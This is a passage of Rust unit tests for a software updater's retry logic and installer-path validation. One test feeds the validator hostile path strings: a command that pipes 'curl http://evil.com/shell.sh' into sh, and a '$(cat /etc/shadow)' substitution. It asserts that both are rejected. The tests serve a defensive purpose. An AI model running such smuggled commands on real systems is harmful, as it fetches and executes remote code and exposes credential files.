        assert!(attempt_delays_retry(&kept, "4.0.44", 1_000 + 3_600));
    }

    #[test]
    fn test_a_later_version_than_the_target_counts_as_completed() {
        assert_eq!(
            settle_attempt(&attempt("4.0.44", 0), "4.0.45"),
            Some(UpdateOutcome::Completed {
                version: "4.0.44".to_string()
            })
        );
    }

    #[test]
    fn test_a_failed_version_is_retried_after_a_day_and_a_newer_one_at_once() {
        let failed = attempt("4.0.44", 1_000);
        assert!(attempt_delays_retry(&failed, "4.0.44", 1_000));
        assert!(attempt_delays_retry(
            &failed,
            "4.0.44",
            1_000 + RETRY_AFTER_FAILURE_SECS - 1
        ));
        assert!(!attempt_delays_retry(
            &failed,
            "4.0.44",
            1_000 + RETRY_AFTER_FAILURE_SECS
        ));
        // Another release is another attempt.
        assert!(!attempt_delays_retry(&failed, "4.0.45", 1_001));
        // A clock set back must not hold updates forever.
        assert!(!attempt_delays_retry(&failed, "4.0.44", 500));
    }

    #[test]
    fn test_an_unreadable_record_blocks_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("update_attempt.json");
        std::fs::write(&path, b"not json").unwrap();
        assert_eq!(load_attempt(&path), None);
        assert_eq!(take_outcome_at(&path, "4.0.43"), None);
    }

    #[test]
    fn test_embedded_key_none_when_unset() {
        // In the test build SENTINEL_UPDATE_PUBKEY is not set, so verification
        // is disabled (fall back to SHA-256 only).
        assert!(matches!(embedded_update_public_key(), Ok(None)));
    }

    #[test]
    fn test_installer_path_rejects_combined_injection() {
        // A realistic injection attempt combining multiple techniques
        let result = validate_installer_path("/tmp/pkg; curl http://evil.com/shell.sh | sh");
        assert!(
            result.is_err(),
            "Combined injection attempt must be rejected"
        );

        // Environment variable expansion attempt
        let result = validate_installer_path("/tmp/$HOME/.config/pkg");
        assert!(
            result.is_err(),
            "Environment variable expansion must be rejected"
        );

        // Command substitution attempt
        let result = validate_installer_path("/tmp/$(cat /etc/shadow)");
        assert!(result.is_err(), "Command substitution must be rejected");
    }
}
